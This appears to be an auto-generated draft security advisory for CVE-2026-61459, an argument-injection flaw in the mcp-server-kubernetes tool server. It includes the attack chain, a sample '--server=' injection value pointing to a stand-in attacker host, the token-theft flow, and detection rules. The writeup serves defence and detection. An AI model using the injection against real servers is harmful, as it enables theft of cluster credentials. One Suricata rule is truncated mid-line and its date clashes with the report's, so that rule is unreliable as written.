> **ThreatForge Output — TECHNICAL_FINDINGS**
>
> CVE:       CVE-2026-61459
> Product:   kubernetes
> Tags:      [RCE] [CRIT] [WIDE] [NEW]
> Score:     90
> Tier:      CRITICAL — ACT NOW
> Generated: 2026-07-14T11:37:35.849112Z
> Status:    OK

# Technical Findings Report — CVE-2026-61459

> **DRAFT FOR ANALYST REVIEW** — This report is a proposed draft produced by ThreatForge for review and validation by a qualified security analyst before operational use. Specific indicators and behavioural patterns should be verified against your environment.

---

## CVE Summary

| Field | Detail |
|---|---|
| **CVE ID** | CVE-2026-61459 |
| **Affected Product** | MCP Server Kubernetes (`mcp-server-kubernetes`) < 3.9.0 |
| **CVSS Score** | 9.8 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) [1] |
| **KEV Status** | Not listed in CISA KEV at time of writing (vulnerability is 2 days old; monitor for addition) |
| **Age** | 2 days |
| **CNA Record** | Published [4] |

> ⚠️ **Note on CVSS sourcing:** The score of 9.8 is drawn from NVD [1]. The CNA-published record [4] has been cited as a separate source. If the CNA record carries a differing score, the analyst **must** reconcile these before using either score for SLA or risk-rating decisions. At time of generation, only one score (9.8) was surfaced in the provided context; if a discrepancy is identified during analyst review, document it here.

---

## Attack Vector

The vulnerability is an **argument injection** flaw in the structured tools interface of MCP Server Kubernetes [1][3]. The attack chain is as follows:

### Root Cause
The `assertNoDangerousFlags` check in versions prior to 3.9.0 can be bypassed by supplying crafted values for the `resourceType` and `name` parameters [1][2]. These parameters are passed unsanitised into `kubectl` invocations. An attacker who controls these parameter values can inject the `--server` flag, redirecting `kubectl` to an attacker-controlled Kubernetes API server endpoint [3].

### Exploitation Conditions

| Component | Detail |
|---|---|
| **Attack Vector** | Network (AV:N) — no local access required [1] |
| **Attack Complexity** | Low (AC:L) — no race conditions or unusual configuration needed [1] |
| **Privileges Required** | None (PR:N) — no prior authentication to the MCP server is required [1] |
| **User Interaction** | None (UI:N) — fully automated exploitation possible [1] |
| **Scope** | Unaffected boundary — but the downstream impact is cluster-wide |

### Mechanism
1. Attacker submits a structured tool call to the MCP server targeting any kubectl-backed operation (e.g., `get`, `describe`).
2. The `resourceType` or `name` parameter is set with a **leading dash**, e.g., `--server=https://attacker.example.com:6443` [1][3].
3. The `assertNoDangerousFlags` function fails to reject this because the check is applied after parameter parsing, or the leading-dash prefix bypasses the string matching logic [2][3].
4. `kubectl` is invoked with the injected `--server` flag, causing it to connect to the attacker-controlled API server.
5. The bearer token used by the local `kubectl` context is transmitted in the `Authorization` header to the attacker's server.
6. With the captured bearer token, the attacker authenticates to the legitimate cluster API server, achieving full cluster compromise [1].

### Patch Reference
Fix committed at [2] — analysts should confirm the exact sanitisation logic change by reviewing the diff at that commit.

---

## Observable Behaviour

### MCP Tool Call Payload Pattern
Malicious tool calls will contain `resourceType` or `name` parameter values beginning with `--`. Example pattern (not exploit code — pattern for detection):

resourceType: "--server=https://<attacker-IP>:<port>"
name:         "--server=https://<attacker-IP>:<port>"

Parameter values with a leading double-dash (`--`) in these fields are anomalous and have no legitimate use [3].

### Process Execution Telemetry
On the host running `mcp-server-kubernetes`, look for `kubectl` child processes spawned with `--server` pointing to an external or unexpected host:

Parent:  node  (mcp-server-kubernetes process)
Child:   kubectl <verb> <resource> --server=https://<unexpected-host>:<port>

In endpoint telemetry (EDR/auditd/eBPF), the process command line for `kubectl` will contain `--server=` with a value that does not match the cluster's known API server address(es).

**auditd rule to surface this (for analyst validation):**
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/kubectl -k kubectl_exec
Then grep captured `EXECVE` records for `--server=` arguments not matching your approved API server FQDNs/IPs.

### Network Indicators

| Indicator | Detail |
|---|---|
| **Outbound connection from kubectl** | TCP to attacker-controlled host on port 6443 (or any non-standard port specified in the injected flag) |
| **Authorization header exfiltration** | `Authorization: Bearer <token>` transmitted to the attacker's server over TLS |
| **DNS** | Unexpected DNS resolution for unknown hostnames from the node running mcp-server-kubernetes |
| **Subsequent cluster access** | Inbound API server requests to your cluster (port 6443) from an IP not matching known kubectl client hosts, using a bearer token previously seen issued to the MCP server service account |

### HTTP / API Server Pattern (Post-Token-Capture)
After token capture, attacker activity against the real cluster API server will resemble:
GET /api/v1/secrets  HTTP/1.1
Host: <cluster-api-server>:6443
Authorization: Bearer <stolen-token>
Source IP will be the attacker's infrastructure, not the MCP server host. Correlate bearer token identity against source IP in API server audit logs.

### Log Sources to Query

| Source | What to Look For |
|---|---|
| Kubernetes API server audit log | `requestURI` for sensitive resources (`/api/v1/secrets`, `/api/v1/serviceaccounts/*/token`) from unexpected source IPs using the MCP service account identity |
| Host process/auditd logs | `kubectl` executions containing `--server=` with non-cluster values |
| Network flow logs | Outbound port 6443 (or HTTP/S) from the MCP server pod/node to external IPs |
| MCP server application logs | Tool invocations where `resourceType` or `name` begin with `-` |

---

## Detection Coverage

### Suricata Network Detection (Draft — Analyst Review Required)

> The following is a draft rule. Since the vulnerability is 2 days old [1] and full packet-level protocol detail for the MCP structured tool call wire format is not confirmed in the available sources, the pattern targets the most reliably observable indicator: outbound kubectl `--server` injection manifesting as TLS ClientHello to unexpected Kubernetes API ports from the MCP server host. A content-layer rule for the MCP JSON payload may require HTTP inspection capability.

# CVE-2026-61459 — MCP Server Kubernetes argument injection
# Draft rule — validate before deployment
# Detects outbound connections from MCP server hosts to non-approved
# Kubernetes API server endpoints (potential --server flag injection)

alert tls any any -> !$KUBE_API_SERVERS 6443 (
    msg:"CVE-2026-61459 MCP-Server-Kubernetes Possible --server Flag Injection - Unexpected kubectl API Destination";
    flow:established,to_server;
    classtype:credential-theft;
    sid:20266145901;
    rev:1;
    metadata:cve CVE-2026-61459, created 2026-06-13, severity critical;
)

alert http any any -> any any (
    msg:"CVE-2026-61459 MCP-Server-Kubernetes Tool Call with Leading-Dash Parameter Value";
    flow:established,to_server;
    http.request_body;
    content:"--server";
    pcre:"/[\"']\s*--server\s*=/";
    class
## Sources (ThreatForge-verified)

[1] NVD — https://nvd.nist.gov/vuln/detail/CVE-2026-61459
[2] github.com — https://github.com/Flux159/mcp-server-kubernetes/commit/d7890f50a4567bf5d9842541ba6f41e180227f9a
[3] github.com — https://github.com/Flux159/mcp-server-kubernetes/issues/328
[4] CVE.org (CNA-published record) — https://www.cve.org/CVERecord?id=CVE-2026-61459
